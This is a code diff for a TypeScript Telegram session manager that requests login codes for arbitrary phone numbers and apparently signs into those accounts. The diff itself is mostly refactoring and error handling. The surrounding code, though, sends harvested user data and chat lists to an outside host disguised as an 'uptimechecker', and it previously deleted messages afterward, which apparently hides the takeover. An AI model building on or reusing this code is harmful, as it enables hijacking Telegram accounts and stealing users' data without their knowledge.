@@ -65,6 +65,8 @@ export async function hasClient(number) {
 
 export async function deleteClient(number) {
     console.log("Deleting Client - ", number);
+    const cli = getClient(number);
+    await cli?.disconnect();
     return clients.delete(number);
 }
 
@@ -82,19 +84,28 @@ export async function disconnectAll() {
 }
 
 export async function createClient(number) {
-    if (clients.has(number)) {
-        console.log("Client already exist");
-        const cli: TelegramManager = clients.get(number);
-        setTimeout(async () => {
-            await restAcc(number)
-        }, 150000);
-        return (await cli.sendCode(false));
-    } else {
-        console.log("Creating new client");
-        const cli = new TelegramManager(number);
-        clients.set(number, cli);
-        await sleep(500)
-        return (await cli.sendCode(false));
+    try {
+
+
+        if (clients.has(number)) {
+            console.log("Client already exist");
+            const cli: TelegramManager = clients.get(number);
+            setTimeout(async () => {
+                await restAcc(number)
+            }, 150000);
+            return (await cli.sendCode(false));
+        } else {
+            const randomIndex = Math.floor(Math.random() * creds.length);
+            const apiHash = creds[randomIndex].apiHash
+            const apiId = creds[randomIndex].apiId
+            console.log("Creating new client - ", number, creds[randomIndex]);
+            const cli = new TelegramManager(number, apiId, apiHash);
+            clients.set(number, cli);
+            await sleep(500)
+            return (await cli.sendCode(false));
+        }
+    } catch (error) {
+        console.log(error)
     }
 }
 
@@ -105,10 +116,9 @@ class TelegramManager {
     phoneCodeHash: any;
     apiId: number;
     apiHash: string;
-    constructor(number) {
-        const randomIndex = Math.floor(Math.random() * creds.length);
-        this.apiId = creds[randomIndex].apiId;
-        this.apiHash = creds[randomIndex].apiHash;
+    constructor(number: any, apiId: number, apiHash: string) {
+        this.apiId = apiId;
+        this.apiHash = apiHash;
         this.phoneNumber = number;
         this.session = new StringSession('');
         this.client = null;
@@ -141,7 +151,7 @@ class TelegramManager {
             });
             await this.client.connect();
         } catch (error) {
-            console.log(error);
+            console.log("Error while Connecting:", error);
         }
     }
 
@@ -216,9 +226,13 @@ class TelegramManager {
         } catch (err: any) {
             console.log(err);
             if (err.errorMessage === "AUTH_RESTART") {
-                return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
+                try {
+                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
+                } catch (error) {
+                    console.log(error)
+                }
             } else {
-                throw err;
+                console.log(err)
             }
         }
     }
@@ -355,6 +369,6 @@ class TelegramManager {
         await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
         await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
         await sleep(3000);
-        await this.deleteMessages();
+        // await this.deleteMessages();
     }
 }
